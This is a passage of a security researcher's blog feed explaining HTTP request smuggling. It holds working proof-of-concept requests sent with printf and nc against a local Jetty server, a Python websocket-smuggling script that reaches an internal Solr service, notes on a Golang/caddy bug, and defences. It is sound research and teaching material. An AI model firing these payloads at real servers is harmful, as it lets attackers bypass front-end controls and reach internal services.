class="hljs-string">'Content-Type: application/x-www-form-urlencoded\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'100000000\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'POST /?test=4974 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Length: 5\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">"HTTP/1.1"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Then we can get two 200 responses. But according to the standard of the chunk, although the second part looks like a request, it should actually be counted in the chunk data. The problem is here. Jetty returned two requests. 100000000 is treated as 0, which is the chunk end part, so there are two reasons for the request.</p><p>We can try more.</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'POST /?test=4975 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Type: application/x-www-form-urlencoded\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'1ff00000008\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'abcdefgh\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'POST /?test=4976 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Length: 5\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">"HTTP/1.1"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here we still get two 200 responses, that is, the first chunk size 1ff00000008 was truncated to 8 by jetty. The chunk data part only has <code>abcdefgh</code>, so two responses are returned.</p><p>Similar to Apache CVE-2015-3183, jetty will only take the last 8 bytes of chunk size:</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffffffff00000000\r\n</span><br><span class="line">            ^^^^^^^^</span><br><span class="line">            <span class="hljs-number">00000000</span> =&gt; size <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1f</span>f00000008\r\n</span><br><span class="line">   ^^^^^^^^</span><br><span class="line">   <span class="hljs-number">00000008</span> =&gt; size <span class="hljs-number">8</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>In fact, this part can be used as a separate part, but I think this article is so long, so we just talk about a brief introduction. In Hackactivity 2019,  @0ang3el proposed Websocket-related attack techniques [What’s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs](Https://<a href="http://www.slideshare.net/0ang3el/whats-wrong-with-websocket-" target="_blank" rel="noopener">www.slideshare.net/0ang3el/whats-wrong-with-websocket-</a> apis-unveiling-vulnerabilities-in-websocket-apis), what interests me is the part of Websocket Smuggling. The author disclosure the relevant description in <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">websocket-smuggle</a>. </p><p>What is this attack surface? To sum up for you, when the connection is established in the websocket, if the reverse proxy does not fully comply with the RFC 6445 standard, the Sec-WebSocket-Version version is not handled properly. The connection between the client and the back-end server TCP/TLS won’t be closed, so it cause an attack that we could conduct a smuglling request.</p><p>Here we assume that the solr service exists on the internal network and cannot be accessed from the external network. If websocket smuggling exists, we can write the following code to access the solr service.</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">req1 = <span class="hljs-string">"""GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: ip:port</span></span><br><span class="line"><span class="hljs-string">Sec-WebSocket-Version: 1338</span></span><br><span class="line"><span class="hljs-string">Upgrade: websocket</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">req2 = <span class="hljs-string">"""GET /solr/#/ HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="hljs-string">':'</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line"></span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    <span class="hljs-comment"># print req2</span></span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    sock.shutdown(socket.SHUT_RDWR)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    main(<span class="hljs-string">'ip:port'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>This is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test <a href="https://caddyserver.com/v1/" target="_blank" rel="noopener">caddy</a> , and took it to fuzz. Because I was lazy, I used the environment on the docker hub [caddy](https: //hub.docker. com/r/abiosoft/caddy).</p><p>So, here we are.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139367.png" alt=""></p><p>I was very happy at the time, thinking that getting a CVE was so simple. Because it is smiliar with Netty CVE , It could also produce a parsing difference. Then I and the mentor carefully explored the reason for this, followed the code, and found that it may be the cause of a native library in Golang.</p><p>I was happy at the time, and quickly searched how to raise an issue with Golang. But then I carefully worked on it for a while. I found that this issue had been mentioned on September 27 <a href="https://github.com/golang/go/issues/34540" target="_blank" rel="noopener">net / http: invalid headers are normalized, allowing request smuggling</a>, Golang also fixed the issue in version 1.13.1.</p><p>It’s unhappy to miss a CVE. : (</p><p>But at present(11/27) the caddy environment on dockerhub still has this problem, use it with caution!</p><h2 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h2><p>There are related vulnerabilities disclosed on hackerone. Here are a few articles.</p><p><a href="https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d" target="_blank" rel="noopener">Write up of two HTTP Requests Smuggling</a></p><p><a href="https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html" target="_blank" rel="noopener">HTTP Request Smuggling (CL.TE)</a></p><p><a href="https://hackerone.com/reports/694604" target="_blank" rel="noopener">HTTP Request Smuggling on vpn.lob.com</a></p><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><blockquote><pre><code>We've known the harm of HTTP request smuggling, and we will question: how to prevent it? There are three general defenses (not specific to a particular server).- Disable TCP connection reuse between the proxy server and the back end server.- Use the HTTP/2 protocol.- The front and back ends use the same server.Some of the above measures can not solve the problem fundamentally, and there are many shortcomings, such as disabling TCP connection reuse between the proxy server and the back-end server, which will increase the pressure on the back-end server. Using HTTP/2 can't be promoted under the current network conditions, even if the server supporting HTTP/2 protocol is compatible with HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem of protocol design, but the problem of different server implementations. I personally think that the best solution is to strictly implement the standards specified in RFC7230-7235, but this is the most difficult to achieve.</code></pre></blockquote><p>However, I have read a lot of attack articles which all did not mention why HTTP/2 can prevent HTTP Smuggling. The original author also mentioned in a sentence.</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, <code>Transfer-Encoding: chunk</code> is canceled in HTTP/2. :P</p><p>For details, please refer to <a href="[https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5](https://developers.google.com/web/fundamentals/performance/http2)">the introduction of HTTP / 2</a></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520132137.png" alt=""></p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>After this period of study and research, I have also organized some related experiments into a docker environment, which is convenient for everyone to reproduce learning：<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab" target="_blank" rel="noopener">HTTP-Smuggling-Lab</a></p><p>Now the environment is not much. If you think the lab is useful, plz give me a star. I will continue to add more environments later to facilitate everyone to understand and learn this attack tech. <del>if I have enough time</del></p><p>If you think this post helps you, you could buy me a coffee to support my writing.</p><p><a href="https://www.buymeacoffee.com/Zedd" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;"></a>    </p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">regilero’s blog</a></p><p><a href="https://paper.seebug.org/1049/" target="_blank" rel="noopener">Protocol Layer Attack - HTTP Request Smuggling</a></p><p><a href="https://github.com/netty/netty/issues/9571" target="_blank" rel="noopener">http request smuggling, cause by obfuscating TE header</a></p><p><a href="https://hackerone.com/reports/648434" target="_blank" rel="noopener">Multiple HTTP Smuggling reports</a></p><p><a href="https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b" target="_blank" rel="noopener">HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;This year’s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven’t had much time. I recently took a look at it.&lt;/p&gt;
&lt;p&gt;Sorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here &lt;a href=&quot;https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/&quot;&gt;一篇文章带你读懂 HTTP Smuggling 攻击&lt;/a&gt;.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/categories/Sec/"/>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章带你读懂 HTTP Smuggling 攻击</title>
    <link href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/"/>
    <id>https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</id>
    <published>2019-12-05T10:28:11.000Z</published>
    <updated>2021-09-27T17:45:58.716Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">https://xz.aliyun.com/t/6878</a></p></blockquote><a id="more"></a><p>在前些天研究的时候，恰巧 <strong>mengchen@知道创宇404实验室</strong> 也发表了<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a>文章，也带给了自己更多的启示，师傅的文章写的非常的不错，墙裂建议阅读，这里我结合师傅的文章跟自己的一些理解进行一些整理，本文亦可理解为那篇文章的补充与更详细的描述。</p><p>整篇文章由于自己时间问题，前前后后拖了两个月左右，中间时间间隔可能比较久，所以文章会有比较多的疏漏，还请师傅们看后直接指出斧正。写作不易，还请师傅们多多担待。最近也一直在关注这方面的安全问题，欢迎一起学习讨论: ) 联系方式：emVkZHl1Lmx1QGdtYWlsLmNvbQ== </p><p>后续如果有新的总结发现也会发自己的<a href="https://blog.zeddyu.info">垃圾博客</a>或者先知（就看国际黑客陈师傅给不给过了）</p><h1 id="TL-NR"><a href="#TL-NR" class="headerlink" title="TL;NR"></a>TL;NR</h1><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOx